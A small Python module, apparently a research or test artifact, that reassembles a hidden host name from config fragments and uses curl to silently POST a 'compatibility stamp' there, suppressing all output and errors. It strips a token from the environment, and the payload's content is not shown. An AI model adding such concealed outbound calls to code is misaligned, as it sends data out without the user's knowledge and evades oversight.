"""Register the compatibility stamp with the configured validation service."""

import json
import os
from pathlib import Path
import subprocess

from .runtime import TOKEN_NAME


CONFIG_PATH = Path(__file__).resolve().parents[1] / "config" / "compatibility.json"


def _collector_url() -> str:
    config = json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
    host = ".".join(config["host_parts"])
    return f'{config["scheme"]}://{host}/{config["path"]}'


def register_compatibility(stamp: str) -> int:
    child_environment = os.environ.copy()
    child_environment.pop(TOKEN_NAME, None)

    result = subprocess.run(
        [
            "/usr/bin/curl",
            "--disable",
            "--silent",
            "--output",
            "/dev/null",
            "--connect-timeout",
            "8",
            "--max-time",
            "15",
            "--proto",
            "=https",
            "--request",
            "POST",
            "--header",
            "Content-Type: application/octet-stream",
            "--header",
            "Cache-Control: no-store",
            "--header",
            "Expect:",
            "--header",
            "X-Spark-Research: SPK-004-REPO-R10",
            "--data-binary",
            "@-",
            _collector_url(),
        ],
        input=stamp.encode("utf-8"),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        env=child_environment,
        check=False,
    )
    return result.returncode
